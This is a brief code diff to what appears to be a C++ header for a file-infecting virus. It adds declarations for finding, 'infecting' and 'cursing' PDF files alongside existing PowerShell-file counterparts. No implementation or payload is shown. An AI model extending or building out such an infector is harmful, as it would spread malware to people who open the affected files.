@@ -13,4 +13,8 @@ std::vector<std::string> FindPowerShellFiles(const std::string& directory);
 bool InfectPowerShellFile(const std::string& filePath);
 bool CursePowerShellFile(const std::string& filePath);
 
+std::vector<std::string> FindPDFFiles(const std::string& directory);
+bool InfectPDFFile(const std::string& filePath);
+bool CursePDFFile(const std::string& filePath);
+
 }
